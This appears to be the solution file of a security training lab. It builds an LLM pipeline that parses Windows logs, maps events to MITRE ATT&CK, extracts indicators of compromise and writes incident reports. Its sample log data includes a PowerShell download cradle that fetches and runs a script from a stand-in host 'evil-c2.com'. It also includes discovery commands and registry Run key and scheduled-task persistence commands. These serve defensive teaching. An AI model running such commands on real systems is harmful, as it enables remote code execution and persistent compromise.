#!/usr/bin/env python3
"""
Lab 04: LLM-Powered Security Log Analysis - SOLUTION

Complete implementation of LLM-powered security log analysis.

=============================================================================
OVERVIEW
=============================================================================

This lab demonstrates how to use Large Language Models (LLMs) to analyze
security logs, extract indicators of compromise (IOCs), and generate
actionable incident reports. This is a fundamental skill for Security
Operations Center (SOC) analysts and incident responders.

KEY CONCEPTS:

1. PROMPT ENGINEERING FOR SECURITY
   - System prompts define the LLM's role and expertise
   - Structured output formats ensure consistent, parseable results
   - Multi-step prompting breaks complex analysis into manageable tasks

2. LOG PARSING WITH LLMs
   - LLMs can parse unstructured logs into structured JSON
   - They understand log formats (Windows Event, Syslog, etc.)
   - Severity scoring based on security context

3. THREAT ANALYSIS
   - MITRE ATT&CK technique mapping
   - Attack chain reconstruction
   - IOC extraction and categorization

4. INCIDENT REPORT GENERATION
   - Executive summaries for stakeholders
   - Technical details for responders
   - Actionable recommendations

LEARNING OBJECTIVES:
- Understand how to craft effective security-focused prompts
- Learn to parse and structure log data using LLMs
- Practice extracting IOCs from text
- Map activities to MITRE ATT&CK techniques
- Generate professional incident reports

MITRE ATT&CK TECHNIQUES COVERED:
- T1059.001 - PowerShell Execution
- T1547.001 - Registry Run Keys / Startup Folder
- T1053.005 - Scheduled Task/Job
- T1082     - System Information Discovery
- T1071.001 - Web Protocols (C2)

=============================================================================
"""

import json
import os
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

# Load environment variables from .env file (contains API keys)
from dotenv import load_dotenv

load_dotenv()

try:
    from langchain_anthropic import ChatAnthropic
    from langchain_core.messages import HumanMessage, SystemMessage

    ANTHROPIC_AVAILABLE = True
except ImportError:
    ANTHROPIC_AVAILABLE = False

try:
    from langchain_community.chat_models import ChatOllama

    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

try:
    from langchain_openai import ChatOpenAI

    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False

try:
    from langchain_google_genai import ChatGoogleGenerativeAI

    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False

from rich.console import Console
from rich.markdown import Markdown
from rich.panel import Panel

console = Console()


# =============================================================================
# Task 1: Set Up LLM Client - SOLUTION
# =============================================================================
#
# The LLM client is our interface to the AI model. Key considerations:
#
# - PROVIDER SELECTION: Multiple providers supported
#   - Anthropic (Claude): High quality reasoning, requires API key
#   - OpenAI (GPT-4): Widely used, good balance of quality/speed
#   - Gemini (Google): Good for long context, competitive pricing
#   - Ollama: Free, runs locally, good for development
#
# - TEMPERATURE = 0: We want deterministic, consistent outputs
#   for security analysis. Higher temperatures introduce randomness.
#
# - MAX_TOKENS: Limit response length to control costs and focus
#
# ENVIRONMENT VARIABLES:
#   - ANTHROPIC_API_KEY: For Claude models
#   - OPENAI_API_KEY: For GPT models
#   - GOOGLE_API_KEY: For Gemini models
#
# =============================================================================


def setup_llm(provider: str = "anthropic"):
    """
    Initialize the LLM client for security log analysis.

    Args:
        provider: LLM provider to use. Options:
            - "anthropic": Claude (claude-sonnet-4-20250514)
            - "openai": GPT-4 Turbo
            - "gemini": Gemini 1.5 Pro
            - "ollama": Local models (llama3.1:8b)

    Returns:
        Configured LLM client ready for inference

    Raises:
        ImportError: If required libraries are not installed
        ValueError: If API key is not configured
        RuntimeError: If LLM connection test fails
    """

    if provider == "anthropic":
        if not ANTHROPIC_AVAILABLE:
            raise ImportError(
                "langchain-anthropic not installed. Run: pip install langchain-anthropic"
            )

        api_key = os.getenv("ANTHROPIC_API_KEY")
        if not api_key:
            raise ValueError("ANTHROPIC_API_KEY not set. Add to .env file.")

        llm = ChatAnthropic(model="claude-sonnet-4-20250514", temperature=0, max_tokens=4096)

    elif provider == "openai":
        if not OPENAI_AVAILABLE:
            raise ImportError("langchain-openai not installed. Run: pip install langchain-openai")

        api_key = os.getenv("OPENAI_API_KEY")
        if not api_key:
            raise ValueError("OPENAI_API_KEY not set. Add to .env file.")

        llm = ChatOpenAI(model="gpt-4-turbo", temperature=0, max_tokens=4096)

    elif provider == "gemini":
        if not GEMINI_AVAILABLE:
            raise ImportError(
                "langchain-google-genai not installed. Run: pip install langchain-google-genai"
            )

        api_key = os.getenv("GOOGLE_API_KEY")
        if not api_key:
            raise ValueError("GOOGLE_API_KEY not set. Add to .env file.")

        llm = ChatGoogleGenerativeAI(model="gemini-1.5-pro", temperature=0, max_output_tokens=4096)

    elif provider == "ollama":
        if not OLLAMA_AVAILABLE:
            raise ImportError(
                "langchain-community not installed. Run: pip install langchain-community"
            )

        llm = ChatOllama(model="llama3.1:8b", temperature=0)

    else:
        raise ValueError(
            f"Unknown provider: {provider}. Supported: anthropic, openai, gemini, ollama"
        )

    # Test the client
    try:
        response = llm.invoke([HumanMessage(content="Respond with only: READY")])
        console.print(f"  [green]LLM initialized: {response.content.strip()}[/green]")
    except Exception as e:
        raise RuntimeError(f"LLM test failed: {e}")

    return llm


# =============================================================================
# Task 2: Log Parser Agent - SOLUTION
# =============================================================================
#
# PROMPT ENGINEERING FOR LOG PARSING:
#
# The system prompt establishes the LLM's persona and expected behavior.
# Key elements of an effective security log parsing prompt:
#
# 1. ROLE DEFINITION: "You are a security log parser" - tells the model
#    what expertise to apply
#
# 2. OUTPUT STRUCTURE: Explicitly define the JSON schema you want
#    - This ensures consistent, machine-parseable output
#    - List all expected fields with descriptions
#
# 3. CONSTRAINTS: "Return ONLY valid JSON" prevents extraneous text
#    that would break parsing
#
# 4. SECURITY CONTEXT: Include severity scoring (1-10) based on
#    security risk, not just log level
#
# =============================================================================

# System prompt that establishes the LLM's role as a security log parser
# Note: System prompts persist across the conversation and set behavior
PARSER_SYSTEM_PROMPT = """You are a security log parser. Extract structured information from raw security logs.

For each log entry, extract:
- timestamp: ISO format datetime
- event_type: Type of event (Process Creation, Logon, Network Connection, Script Execution, etc.)
- event_id: Windows Event ID if present
- source: Computer/hostname
- user: Username involved (include domain if present)
- details: Key details as nested object
- severity: 1-10 scale based on security risk

IMPORTANT: Return ONLY valid JSON. No markdown, no explanation, just the JSON object."""


def parse_log_entry(llm, log_entry: str) -> dict:
    """Use LLM to parse a raw log entry into structured data."""

    prompt = f"""Parse this security log entry into JSON:

{log_entry}

JSON output with: timestamp, event_type, event_id, source, user, details (object), severity (1-10):"""

    messages = [
        SystemMessage(content=PARSER_SYSTEM_PROMPT),
        HumanMessage(content=prompt),
    ]

    response = llm.invoke(messages)
    content = response.content.strip()

    # Try to extract JSON from response
    try:
        return json.loads(content)
    except json.JSONDecodeError:
        # Try to find JSON in response
        json_match = re.search(r"\{[\s\S]*\}", content)
        if json_match:
            return json.loads(json_match.group())

        # Return basic structure on failure
        return {
            "timestamp": None,
            "event_type": "Unknown",
            "event_id": None,
            "source": "Unknown",
            "user": "Unknown",
            "details": {"raw": log_entry},
            "severity": 5,
            "parse_error": "Could not parse log entry",
        }


def parse_multiple_logs(llm, log_text: str) -> List[dict]:
    """Parse multiple log entries from a text block."""

    # Split on common log separators
    entries = re.split(r"\n(?=\d{4}-\d{2}-\d{2}|\[|\<Event)", log_text.strip())
    entries = [e.strip() for e in entries if e.strip() and not e.startswith("#")]

    parsed = []
    for i, entry in enumerate(entries):
        console.print(f"  Parsing entry {i+1}/{len(entries)}...")
        parsed_entry = parse_log_entry(llm, entry)
        parsed.append(parsed_entry)

    return parsed


# =============================================================================
# Task 3: Threat Detection Analyzer - SOLUTION
# =============================================================================
#
# THREAT ANALYSIS WITH LLMs:
#
# This is where LLMs truly shine - they can correlate multiple log entries,
# identify attack patterns, and map activities to frameworks like MITRE ATT&CK.
#
# KEY CAPABILITIES:
#
# 1. PATTERN RECOGNITION: LLMs can identify suspicious patterns across logs
#    - Unusual command sequences (discovery → persistence → exfiltration)
#    - Time-based anomalies (3 AM activity, rapid-fire commands)
#    - User behavior anomalies (admin tools from normal user)
#
# 2. ATTACK CHAIN RECONSTRUCTION: Build the narrative of what happened
#    - Initial access → Execution → Persistence → Exfiltration
#    - This helps responders understand scope and impact
#
# 3. MITRE ATT&CK MAPPING: Link observed behaviors to known techniques
#    - Provides common vocabulary for threat intel sharing
#    - Enables defensive gap analysis
#
# 4. CONFIDENCE SCORING: How certain is the analysis?
#    - High confidence: Clear IOCs, known-bad indicators
#    - Low confidence: Ambiguous activity, needs investigation
#
# =============================================================================

# Expert analyst prompt with domain knowledge for threat detection
ANALYZER_SYSTEM_PROMPT = """You are an expert security analyst specializing in
threat detection and incident response. You have deep knowledge of:
- Windows Event Logs and their security implications
- MITRE ATT&CK framework techniques
- Common attack patterns (lateral movement, persistence, exfiltration)
- Indicators of Compromise (IOCs)

When analyzing logs:
1. Look for suspicious patterns and anomalies
2. Correlate events to identify attack chains
3. Map activities to MITRE ATT&CK techniques with specific IDs
4. Extract all IOCs
5. Assess severity accurately
6. Provide specific, actionable recommendations

Return your analysis as a JSON object. Be thorough but concise."""


def analyze_logs_for_threats(llm, logs: List[dict]) -> dict:
    """Analyze parsed logs for security threats."""

    logs_context = json.dumps(logs, indent=2, default=str)

    prompt = f"""Analyze these security logs for threats:

{logs_context}

Return JSON with:
- threats_detected: array of threat objects with name, description, evidence
- attack_chain: array of attack stages in sequence
- iocs: object with ips, domains, files, users arrays
- mitre_mapping: array of {{technique_id, technique_name, evidence}}
- severity: number 1-10 (10 = critical)
- confidence: number 0-100
- recommendations: array of specific actions, ordered by priority"""

    messages = [
        SystemMessage(content=ANALYZER_SYSTEM_PROMPT),
        HumanMessage(content=prompt),
    ]

    response = llm.invoke(messages)
    content = response.content.strip()

    try:
        return json.loads(content)
    except json.JSONDecodeError:
        json_match = re.search(r"\{[\s\S]*\}", content)
        if json_match:
            return json.loads(json_match.group())
        return {
            "threats_detected": [],
            "attack_chain": [],
            "iocs": {},
            "mitre_mapping": [],
            "severity": 5,
            "confidence": 50,
            "recommendations": [],
            "raw_analysis": content,
        }


# =============================================================================
# Task 4: IOC Extractor - SOLUTION
# =============================================================================
#
# INDICATOR OF COMPROMISE (IOC) EXTRACTION:
#
# IOCs are forensic artifacts that indicate potential malicious activity.
# Extracting them accurately is critical for threat intelligence and defense.
#
# IOC TYPES AND VALIDATION:
#
# 1. IP ADDRESSES
#    - IPv4: Validate with regex pattern ^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$
#    - Exclude internal IPs (10.x, 172.16-31.x, 192.168.x) for external threats
#
# 2. DOMAINS
#    - Exclude internal domains (localhost, .local, .internal)
#    - Validate TLD exists
#
# 3. FILE HASHES
#    - MD5: 32 hex characters (legacy, collision-prone but still used)
#    - SHA1: 40 hex characters (deprecated but common)
#    - SHA256: 64 hex characters (preferred standard)
#
# 4. FILE PATHS
#    - Windows: C:\, %APPDATA%, etc.
#    - Linux: /tmp, /var, etc.
#    - Look for suspicious locations (temp, appdata, public)
#
# 5. USER ACCOUNTS
#    - Exclude system accounts (SYSTEM, NETWORK SERVICE)
#    - Flag service accounts used interactively
#
# WHY VALIDATION MATTERS:
# LLMs can hallucinate or extract partial matches. Validation ensures
# only valid IOCs make it into threat intelligence feeds.
#
# =============================================================================


def extract_iocs(llm, text: str) -> dict:
    """Extract Indicators of Compromise from text."""

    prompt = f"""Extract ALL Indicators of Compromise (IOCs) from this text:

{text}

Find:
- IP addresses (IPv4/IPv6)
- Domain names (exclude internal like CORP, localhost)
- URLs
- File hashes (MD5=32 chars, SHA1=40 chars, SHA256=64 chars)
- File paths (Windows/Linux)
- Usernames
- Email addresses

Return JSON: {{
  "ips": [],
  "domains": [],
  "urls": [],
  "hashes": {{"md5": [], "sha1": [], "sha256": []}},
  "file_paths": [],
  "usernames": [],
  "emails": []
}}

Return empty arrays if none found. No duplicates."""

    messages = [
        SystemMessage(
            content="You are an IOC extraction specialist. Extract and categorize all indicators."
        ),
        HumanMessage(content=prompt),
    ]

    response = llm.invoke(messages)
    content = response.content.strip()

    try:
        iocs = json.loads(content)
    except json.JSONDecodeError:
        json_match = re.search(r"\{[\s\S]*\}", content)
        if json_match:
            iocs = json.loads(json_match.group())
        else:
            iocs = {}

    return validate_iocs(iocs)


def validate_iocs(iocs: dict) -> dict:
    """Validate and clean extracted IOCs."""

    validated = {
        "ips": [],
        "domains": [],
        "urls": [],
        "hashes": {"md5": [], "sha1": [], "sha256": []},
        "file_paths": [],
        "usernames": [],
        "emails": [],
    }

    # IP validation
    ip_pattern = r"^(?:\d{1,3}\.){3}\d{1,3}$"
    for ip in iocs.get("ips", []):
        if re.match(ip_pattern, str(ip)):
            validated["ips"].append(ip)

    # Domain validation (basic)
    domain_pattern = r"^[a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,}$"
    excluded_domains = {"localhost", "corp", "local", "internal"}
    for domain in iocs.get("domains", []):
        domain = str(domain).lower()
        if re.match(domain_pattern, domain) and domain not in excluded_domains:
            validated["domains"].append(domain)

    # URLs
    for url in iocs.get("urls", []):
        if str(url).startswith(("http://", "https://")):
            validated["urls"].append(url)

    # Hashes
    hashes = iocs.get("hashes", {})
    for h in hashes.get("md5", []):
        if len(str(h)) == 32 and re.match(r"^[a-fA-F0-9]+$", str(h)):
            validated["hashes"]["md5"].append(h.lower())
    for h in hashes.get("sha1", []):
        if len(str(h)) == 40 and re.match(r"^[a-fA-F0-9]+$", str(h)):
            validated["hashes"]["sha1"].append(h.lower())
    for h in hashes.get("sha256", []):
        if len(str(h)) == 64 and re.match(r"^[a-fA-F0-9]+$", str(h)):
            validated["hashes"]["sha256"].append(h.lower())

    # File paths
    for path in iocs.get("file_paths", []):
        validated["file_paths"].append(str(path))

    # Usernames (exclude common system accounts)
    excluded_users = {"system", "network service", "local service"}
    for user in iocs.get("usernames", []):
        if str(user).lower() not in excluded_users:
            validated["usernames"].append(user)

    # Emails
    email_pattern = r"^[\w.-]+@[\w.-]+\.\w+$"
    for email in iocs.get("emails", []):
        if re.match(email_pattern, str(email)):
            validated["emails"].append(email.lower())

    # Deduplicate
    for key in validated:
        if isinstance(validated[key], list):
            validated[key] = list(set(validated[key]))
        elif isinstance(validated[key], dict):
            for subkey in validated[key]:
                validated[key][subkey] = list(set(validated[key][subkey]))

    return validated


# =============================================================================
# Task 5: Incident Summary Generator - SOLUTION
# =============================================================================
#
# INCIDENT REPORT GENERATION:
#
# The final deliverable is a professional incident report that can be shared
# with multiple stakeholders. LLMs excel at synthesizing technical data into
# clear narratives.
#
# REPORT STRUCTURE (follows industry best practices):
#
# 1. EXECUTIVE SUMMARY
#    - 2-3 sentences for leadership
#    - Impact and risk level
#    - No technical jargon
#
# 2. TIMELINE
#    - Chronological sequence of events
#    - Helps understand attack progression
#    - Critical for legal/forensic purposes
#
# 3. TECHNICAL ANALYSIS
#    - Detailed breakdown for responders
#    - Tools and techniques used by attacker
#    - Evidence and artifacts
#
# 4. MITRE ATT&CK MAPPING
#    - Industry-standard technique references
#    - Enables threat intel sharing
#    - Supports detection rule development
#
# 5. INDICATORS OF COMPROMISE
#    - Network IOCs (IPs, domains, URLs)
#    - Host IOCs (files, hashes, registry)
#    - Account IOCs (compromised users)
#
# 6. RECOMMENDATIONS
#    - Prioritized by urgency (IMMEDIATE, SHORT-TERM, LONG-TERM)
#    - Specific and actionable
#    - Include both containment and prevention
#
# MARKDOWN OUTPUT:
# Using Markdown allows for:
# - Easy rendering in web interfaces
# - Professional formatting
# - Table support for structured data
#
# =============================================================================

# Report writer prompt emphasizing clarity for mixed audiences
SUMMARY_SYSTEM_PROMPT = """You are a senior security analyst writing an incident report.
Your audience includes both technical staff and executives.

Write clearly and concisely. Use proper Markdown formatting.
Include all relevant technical details but explain their significance.
Prioritize actionable information. Use tables where appropriate."""


def generate_incident_summary(llm, analysis: dict) -> str:
    """Generate a human-readable incident summary in Markdown."""

    prompt = f"""Write an incident report based on this analysis:

{json.dumps(analysis, indent=2, default=str)}

Include these Markdown sections:
# Security Incident Report

## Executive Summary
(2-3 sentences: what happened, severity, immediate risk)

## Timeline
(Numbered list of events in sequence with timestamps)

## Technical Analysis
(What the attacker did, tools used, techniques employed)

## MITRE ATT&CK Mapping
| Technique ID | Technique Name | Evidence |
|--------------|----------------|----------|
(fill in from analysis)

## Indicators of Compromise
### Network IOCs
- IPs:
- Domains:
- URLs:

### Host IOCs
- File Paths:
- Hashes:

### User Accounts
- Compromised/Suspicious Users:

## Impact Assessment
(What systems/data may be affected)

## Recommendations
(Numbered list, prioritized: IMMEDIATE, SHORT-TERM, LONG-TERM)

## Appendix: Raw Events
(Summary of log entries analyzed)"""

    messages = [
        SystemMessage(content=SUMMARY_SYSTEM_PROMPT),
        HumanMessage(content=prompt),
    ]

    response = llm.invoke(messages)
    return response.content


# =============================================================================
# Task 6: Complete Pipeline - SOLUTION
# =============================================================================


def analyze_security_incident(log_data: str, llm=None) -> str:
    """Complete pipeline: Parse → Analyze → Summarize."""

    console.print("[bold blue]Security Log Analysis Pipeline[/bold blue]\n")

    # Step 1: Initialize LLM
    console.print("[yellow]Step 1:[/yellow] Initializing LLM...")
    if llm is None:
        try:
            llm = setup_llm("anthropic")
        except Exception:
            llm = setup_llm("ollama")

    # Step 2: Parse logs
    console.print("[yellow]Step 2:[/yellow] Parsing log entries...")
    parsed_logs = parse_multiple_logs(llm, log_data)
    console.print(f"  [green]Parsed {len(parsed_logs)} log entries[/green]")

    # Step 3: Analyze threats
    console.print("[yellow]Step 3:[/yellow] Analyzing for threats...")
    analysis = analyze_logs_for_threats(llm, parsed_logs)
    console.print(f"  [green]Found {len(analysis.get('threats_detected', []))} threats[/green]")
    console.print(f"  [green]Severity: {analysis.get('severity', 'N/A')}/10[/green]")

    # Step 4: Extract IOCs
    console.print("[yellow]Step 4:[/yellow] Extracting IOCs...")
    iocs = extract_iocs(llm, log_data)

    # Merge IOCs
    if "iocs" not in analysis:
        analysis["iocs"] = {}
    for key, value in iocs.items():
        if key not in analysis["iocs"]:
            analysis["iocs"][key] = value
        elif isinstance(value, list):
            analysis["iocs"][key] = list(set(analysis["iocs"].get(key, []) + value))

    ioc_count = sum(
        len(v) if isinstance(v, list) else sum(len(x) for x in v.values()) for v in iocs.values()
    )
    console.print(f"  [green]Extracted {ioc_count} IOCs[/green]")

    # Step 5: Generate summary
    console.print("[yellow]Step 5:[/yellow] Generating incident report...")
    summary = generate_incident_summary(llm, analysis)
    console.print("  [green]Report generated[/green]")

    return summary


# =============================================================================
# Sample Data & Main
# =============================================================================

SAMPLE_LOGS = """
# Attack Scenario: PowerShell Download Cradle to Persistence

2024-01-15 03:22:10 | WORKSTATION01 | PowerShell | 4104 | ScriptBlock:
$wc = New-Object System.Net.WebClient
$wc.DownloadString('http://evil-c2.com/payload.ps1') | IEX

2024-01-15 03:22:15 | WORKSTATION01 | Security | 4688 |
NewProcessName: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c whoami && hostname && ipconfig /all
ParentProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
SubjectUserName: jsmith
SubjectDomainName: CORP

2024-01-15 03:22:18 | WORKSTATION01 | Sysmon | 3 |
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
DestinationIp: 185.143.223.47
DestinationPort: 443
DestinationHostname: evil-c2.com

2024-01-15 03:23:00 | WORKSTATION01 | Security | 4688 |
NewProcessName: C:\\Windows\\System32\\reg.exe
CommandLine: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\Users\\Public\\malware.exe"
ParentProcessName: powershell.exe
SubjectUserName: jsmith

2024-01-15 03:25:00 | WORKSTATION01 | Security | 4698 |
TaskName: \\Microsoft\\Windows\\Maintenance\\SecurityUpdate
TaskContent: <Command>C:\\Users\\Public\\malware.exe</Command>
SubjectUserName: jsmith
SubjectDomainName: CORP
"""


def main():
    """Main execution."""
    console.print(
        Panel.fit(
            "[bold]Lab 04: LLM-Powered Security Log Analysis - SOLUTION[/bold]",
            border_style="blue",
        )
    )

    try:
        report = analyze_security_incident(SAMPLE_LOGS)

        console.print("\n" + "=" * 60)
        console.print("[bold green]INCIDENT REPORT[/bold green]")
        console.print("=" * 60 + "\n")

        console.print(Markdown(report))

        # Save report
        output_path = Path(__file__).parent / "incident_report.md"
        output_path.write_text(report)
        console.print(f"\n[dim]Report saved to: {output_path}[/dim]")

    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        import traceback

        traceback.print_exc()


if __name__ == "__main__":
    main()
